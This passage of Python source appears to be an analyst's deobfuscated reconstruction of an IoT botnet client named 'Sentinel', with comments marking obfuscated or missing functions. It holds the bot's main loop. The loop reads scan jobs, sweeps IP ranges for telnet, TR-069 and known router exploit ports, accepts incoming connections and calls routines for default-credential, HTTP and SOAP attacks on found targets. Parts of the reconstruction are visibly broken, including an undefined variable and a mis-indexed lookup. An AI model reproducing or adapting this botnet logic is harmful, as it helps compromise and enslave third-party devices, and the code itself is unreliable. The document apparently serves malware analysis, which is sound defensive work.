    # "17h process restart."
    restart = False

    if (timenow - time_startscript > (17 * 3600) and
            len(target_hosts) < 300 and
            len(targeted_hash) == 0 and
            len(HTTP_hashes) == 0 and
            len(requests_targethash) == 0
        ):
        printstatus('NOTC: 17h process restart')
        restart = True

    if restart:
        for s in sock_listen:
            try:
                s.close()
            except:
                pass
        sys.exit(0)

    if reloadconfig:
        printstatus('NOTC: Sentinel reloading config.')
        readsentinel('/tmp/system/control.cfg')

    waitSCN = 0  # Count number of target hosts waiting bc lack of RAM.
    try:
        filelist = os.listdir('/tmp/system/update')
        for file in filelist:
            regresult = re.search('^sentinel\.jobreq\.SCN\.(\S+)\.(\d+\.\d+\.\d+\.)(\d+)\-(\d+)', file)
            if regresult:
                if systemRAM > 2100:
                    scanref = regresult.group(1)
                    scanIPbase = regresult.group(2)
                    scanIPstart = int(regresult.group(3))
                    scanIPstop = int(regresult.group(4))
                    printstatus("NOTC: SCN ref %s for range %s%d - %s%d" %
                                (scanref,
                                 scanIPbase,
                                 scanIPstart,
                                 scanIPbase,
                                 scanIPstop)
                                )
                    os.remove('/tmp/system/update/' + file)
                    for scanIPrange in range(scanIPstart, scanIPstop + 1):
                        scanIP = scanIPbase + '%d' % (scanIPrange)
                        addscanhosts(scanIP, 1)
                    break
                else:
                    printstatus("NOTC: Skipping SCN due to low system RAM %d" %
                                (systemRAM)
                                )
                    waitSCN += 1
            regresult = re.search('^sentinel\.jobreq\.SCN\.(\S+)\.(\d+\.\d+\.\d+\.\d+)',
                                  file
                                  )
            if regresult:
                scanref = regresult.group(1)
                scanIP = regresult.group(2)
                printstatus("NOTC: SCN ref %s for ip %s" % (scanref,
                                                            scanIP))
                os.remove('/tmp/system/update/' + file)
                addscanhosts(scanIP, 1)
                continue
            regresult = re.search('^sentinel\.jobreq\.SCP\.(\S+)\.(\d+)_(\d+\.\d+\.\d+\.)(\d+)\-(\d+)',
                                  file)
            if regresult:
                scanref = regresult.group(1)
                scanport = int(regresult.group(2))
                scanIPbase = regresult.group(3)
                scanIPstart = int(regresult.group(4))
                scanIPstop = int(regresult.group(5))
                printstatus("NOTC: SCP ref %s for range %s%d - %s%d port %d" %
                            (scanref,
                             scanIPbase,
                             scanIPstart,
                             scanIPbase,
                             scanIPstop,
                             scanport
                             )
                            )

                os.remove('/tmp/system/update/' + file)

                if scanport == 1:
                    for scanIPrange in range(scanIPstart, scanIPstop + 1):
                        scanIP = scanIPbase + '%d' % (scanIPrange)
                        addscanhost(scanIP, 23)
                        addscanhost(scanIP, 80)
                        addscanhost(scanIP, 7547)
                        addscanhost(scanIP, 9527)
                        addscanhost(scanIP, 37215)
                        addscanhost(scanIP, 52869)
                elif scanport == 2:
                    for scanIPrange in range(scanIPstart, scanIPstop + 1):
                        scanIP = scanIPbase + '%d' % (scanIPrange)
                        addscanhost(scanIP, 23)
                        addscanhost(scanIP, 80)
                        addscanhost(scanIP, 81)
                        addscanhost(scanIP, 8080)
                        addscanhost(scanIP, 7547)
                        addscanhost(scanIP, 5555)
                        addscanhost(scanIP, 37215)
                        addscanhost(scanIP, 52869)
                elif scanport == 3:
                    for scanIPrange in range(scanIPstart, scanIPstop + 1):
                        scanIP = scanIPbase + '%d' % (scanIPrange)
                        addscanhost(scanIP, 23)
                        addscanhost(scanIP, 80)
                        addscanhost(scanIP, 81)
                        addscanhost(scanIP, 8080)
                        addscanhost(scanIP, 37215)
                        addscanhost(scanIP, 52869)
                elif scanport == 4:
                    for scanIPrange in range(scanIPstart, scanIPstop + 1):
                        scanIP = scanIPbase + '%d' % (scanIPrange)
                        addscanhost(scanIP, 23)
                        addscanhost(scanIP, 60023)
                        addscanhost(scanIP, 4719)
                        addscanhost(scanIP, 80)
                        addscanhost(scanIP, 81)
                        addscanhost(scanIP, 8080)
                        addscanhost(scanIP, 37215)
                        addscanhost(scanIP, 52869)
                elif scanport == 5:
                    for scanIPrange in range(scanIPstart, scanIPstop + 1):
                        scanIP = scanIPbase + '%d' % (scanIPrange)
                        addscanhost(scanIP, 80)
                        addscanhost(scanIP, 81)
                        addscanhost(scanIP, 82)
                        addscanhost(scanIP, 88)
                        addscanhost(scanIP, 8080)
                        addscanhost(scanIP, 8081)
                        addscanhost(scanIP, 8181)
                        addscanhost(scanIP, 8888)
                        addscanhost(scanIP, 37215)
                        addscanhost(scanIP, 52869)
                elif scanport == 6:
                    for scanIPrange in range(scanIPstart, scanIPstop + 1):
                        scanIP = scanIPbase + '%d' % (scanIPrange)
                        addscanhost(scanIP, 23)
                        addscanhost(scanIP, 2323)
                        addscanhost(scanIP, 23231)
                        addscanhost(scanIP, 23123)
                        addscanhost(scanIP, 5358)
                        addscanhost(scanIP, 6789)
                        addscanhost(scanIP, 8023)
                        addscanhost(scanIP, 60023)
                        addscanhost(scanIP, 4719)
                        addscanhost(scanIP, 9527)
                        addscanhost(scanIP, 37215)
                        addscanhost(scanIP, 52869)
                elif scanport == 7:
                    for scanIPrange in range(scanIPstart, scanIPstop + 1):
                        scanIP = scanIPbase + '%d' % (scanIPrange)
                        addscanhost(scanIP, 23)
                        addscanhost(scanIP, 8023)
                        addscanhost(scanIP, 80)
                        addscanhost(scanIP, 81)
                        addscanhost(scanIP, 8080)
                        addscanhost(scanIP, 8000)
                        addscanhost(scanIP, 90)
                        addscanhost(scanIP, 9000)
                        addscanhost(scanIP, 37215)
                        addscanhost(scanIP, 52869)
                elif scanport == 9:
                    for scanIPrange in range(scanIPstart, scanIPstop + 1):
                        scanIP = scanIPbase + '%d' % (scanIPrange)
                        addscanhost(scanIP, 23)
                        addscanhost(scanIP, 80)
                        addscanhost(scanIP, 81)
                        addscanhost(scanIP, 8080)
                        addscanhost(scanIP, 7547)
                        addscanhost(scanIP, 5555)
                        addscanhost(scanIP, random.randint(1, 65535))
                        addscanhost(scanIP, 37215)
                        addscanhost(scanIP, 52869)
                elif scanport == 10:
                    for scanIPrange in range(scanIPstart, scanIPstop + 1):
                        scanIP = scanIPbase + '%d' % (scanIPrange)
                        addscanhost(scanIP, 23)
                        addscanhost(scanIP, 80)
                        addscanhost(scanIP, 81)
                        addscanhost(scanIP, 8080)
                        addscanhost(scanIP, random . randint(1, 65535))
                        addscanhost(scanIP, random . randint(1, 65535))
                        addscanhost(scanIP, random . randint(1, 65535))
                        addscanhost(scanIP, random . randint(1, 65535))
                        addscanhost(scanIP, random . randint(1, 65535))
                        addscanhost(scanIP, random . randint(1, 65535))
                        addscanhost(scanIP, 37215)
                        addscanhost(scanIP, 52869)
                elif scanport == 11:
                    for scanIPrange in range(scanIPstart, scanIPstop + 1):
                        scanIP = scanIPbase + '%d' % (scanIPrange)
                        addscanhost(scanIP, 23)
                        addscanhost(scanIP, 80)
                        addscanhost(scanIP, 81)
                        addscanhost(scanIP, 82)
                        addscanhost(scanIP, 8080)
                        addscanhost(scanIP, 7547)
                        addscanhost(scanIP, 8023)
                        addscanhost(scanIP, 60023)
                        addscanhost(scanIP, 23231)
                        addscanhost(scanIP, 9527)
                        addscanhost(scanIP, random.randint(1, 65535))
                        addscanhost(scanIP, 37215)
                        addscanhost(scanIP, 52869)
                elif scanport == 12:
                    for scanIPrange in range(scanIPstart, scanIPstop + 1):
                        scanIP = scanIPbase + '%d' % (scanIPrange)
                        addscanhost(scanIP, 23)
                        addscanhost(scanIP, 80)
                        addscanhost(scanIP, 81)
                        addscanhost(scanIP, 82)
                        addscanhost(scanIP, 8080)
                        addscanhost(scanIP, 8023)
                        addscanhost(scanIP, 60023)
                        addscanhost(scanIP, 23231)
                        addscanhost(scanIP, random.randint(1, 65535))
                        addscanhost(scanIP, 37215)
                        addscanhost(scanIP, 52869)
                elif scanport == 13:
                    for scanIPrange in range(scanIPstart, scanIPstop + 1):
                        scanIP = scanIPbase + '%d' % (scanIPrange)
                        addscanhost(scanIP, 23)
                        addscanhost(scanIP, 2323)
                        addscanhost(scanIP, 80)
                        addscanhost(scanIP, 81)
                        addscanhost(scanIP, 8080)
                        addscanhost(scanIP, 7547)
                        addscanhost(scanIP, 37215)
                        addscanhost(scanIP, 52869)
                else:
                    for scanIPrange in range(scanIPstart, scanIPstop + 1):
                        scanIP = scanIPbase + '%d' % scanIPrange
                        addscanhost(scanIP, scanport)
                break
            else:
                regresult = re.search('^sentinel\.jobreq\.SCP\.(\S+)\.(\d+)_(\d+\.\d+\.\d+\.\d+)',
                                      file)
                if regresult:
                    scanref = regresult.group(1)
                    scanport = int(regresult.group(2))
                    scanIP = regresult.group(3)
                    printstatus("NOTC: SCP ref %s for ip %s port %d" %
                                (scanref,
                                 scanIP,
                                 scanport
                                 )
                                )
                    os.remove('/tmp/system/update/' + file)
                    addscanhost(scanIP, scanport)
                    continue
    except:
        pass

    if waitSCN >= 3:
        printstatus("ERR: Backlog of %d scans due to low RAM %d" %
                    (waitSCN, systemRAM)
                    )


time.sleep(3)

listenN = 0

# Indicates if timely jobs have been loaded into target_hosts[].
jobs_in_targethosts = False

# Listen to all ports in ports_listen on host.
for listenport in ports_listen:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Reuse socket.
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        s.bind(('0.0.0.0', int(listenport)))
        s.listen(5)
        sock_listen.append(s)
        listen_socks[int(listenport)] = s
        listenN += 1
    except:
        pass

printstatus("Sentinel Process Launch (%d listeners)" % listenN)

# Times for calling connectotarget() and target_sendkill()
time_targets_sendkill = time.time()

# Time to reload config file via loadconfigs() and reload jobs.
time_reloadconfig = 0

time_clearincominghosts = time.time()  # Clear incominghosts[] every 8 hrs.

# Print incoming, target host info and reset incoming stats every hour.
time_printstatus = time.time()

while True:
    # ii1IIIi1 Unknown function, invisible to this code. As this is followed by
    # killtargets(), it may be function to populate lists/dictionaries of
    # targets.
    unknownfunction()

    timenow = time.time()

    resettime_nextconnect()  # From first block (default creds).
    killtargets()

    HTTP_connecttargets()  # From fourth block (HTTP requests).
    requests_sockconnect()
    HTTP_targets_send()

    requests_attack()  # From fifth block (SOAP, TR069).

    connecttowebtargets()  # From third block (GET .//////).
    webtargets_sendrequests()

    # Host telnet (port 23, 2323) to listen for incoming connections.
    hosttelnet()  # From second block.

    sockreadyr, sockreadyw, noneready = select.select(sock_listen,
                                                      [],
                                                      [],
                                                      0.01)
    for s in sockreadyr:
        try:
            sock, address = s.accept()
        except:
            continue
        # Address is (host, port) of incoming; host may be hostname or IP.
        incominghost, incomingport = address
        incominghash = hash(incominghost)
        # If host has made incoming connection before, drop.
        if incominghash in incominghosts:
            try:
                sock.close()
            except:
                pass

            continue

        incominghosts[incominghash] = 1
        myhost, myport = sock.getsockname()

        if port in ports_unused:  # ports_unused is always empty.
            listen_unused.append(sock)
            sockhash = hash(sock)
            listen_tunnels[sockhash] = '%s:%d>%s:%d' % (incominghost,
                                                        incomingport,
                                                        myhost,
                                                        myport
                                                        )
        else:
            if config_sTN:
                printstatus('%s:%d>%s:%d TN' % (incominghost, incomingport,
                                                myhost, myport
                                                )
                            )
            # If incoming host found, add to list of hosts to scan later.
            addscanhosts(incominghost, myport)
            count_incoming(incominghost, myport)

            # Ii1IIi1iI1i1I is unknown variable not visible in this code.
            if Ii1IIi1iI1i1I == 1 and (myport == 23 or myport == 2323):
                initsock(sock, incominghost, myport)
            else:
                try:
                    sock.close()
                except:
                    pass

    sockreadyr, sockreadyw, noneready = select.select(listen_unused,
                                                      [],
                                                      [],
                                                      0.01)
    for s in sockreadyr:
        intext = unknown_func(s, 1)  # O0OO0 Unknown function.
        sockhash = hash(s)
        if intext:
            if re.search('mips-unknown-linux-gnu', intext):
                printstatus("%s MF" % (listen_tunnels[sockhash]))
                hosts = listen_tunnels[sockhash].split(':')  # %s:%d>%s:%d

                addscanhosts(listen_tunnels[0], int(listen_tunnels[2]))
                count_incoming(listen_tunnels[0], 80)  # Why assumes port 80?
        try:
            s.close()
        except:
            pass
        listen_unused.remove(s)
        listen_tunnels[sockhash] = None

    if timenow - time_targets_sendkill > 3:
        # 300 <= idx_max <=  3000
        idx_max = min(max(len(target_hosts) / 100, 3), 30)
        for idx in range(idx_max):
            connecttotarget()
        targets_sendkill()
        time_targets_sendkill = timenow

    if timenow - time_reloadconfig > 300:
        loadconfigs()

        if if_s_active == 0 and len(target_hosts) == 0:
            sock_active = []
            target_noconnect = {}
            target_active = {}
            target_steps = {}
            target_lastactiontime = {}
            http_intext = {}
            target_hosts = []

        # Save only jobs in jobslist that are not in jobs_target, and clear
        # out jobs_target.
        if len(jobs_targets):
            newjobslist = []
            for job in jobslist:
                hasmatch = 0
                for job_target in jobs_targets:
                    if (job_target[0] == job[1] and  # hostname
                            int(job_target[1]) == int(job[2])  # port
                        ):
                        hasmatch = 1
                        break
                if not hasmatch:
                    newjobslist.append(job)
            jobslist = newjobslist
            jobs_targets = []

        if jobs_in_targethosts:
            unknowns = {}
            for job in jobslist:
                unknowns[hash(job[1])] = 1  # hash(hostname)

            targets_unknown = unknowns
            jobs_in_targethosts = False

        jobs_timely = getjobs(time.time())

        for job in jobs_timely:
            hostname = job[1]  # hostname
            port = int(job[2])  # port

            target_hosts.insert(0, "%s:%d" % (hostname, port))

            jobs_in_targethosts = True

        time_reloadconfig = timenow

    if timenow - time_clearincominghosts > 28800:
        incominghosts = {}
        time_clearincominghosts = timenow

    if timenow - time_printstatus > 3600:
        ipports = print_incomingipport()
        if len(ipports) >= 8:
            printstatus(ipports)
            printstatus(print_requestipport())
        reset_incoming()
        time_printstatus = timenow

    time.sleep(0.01)

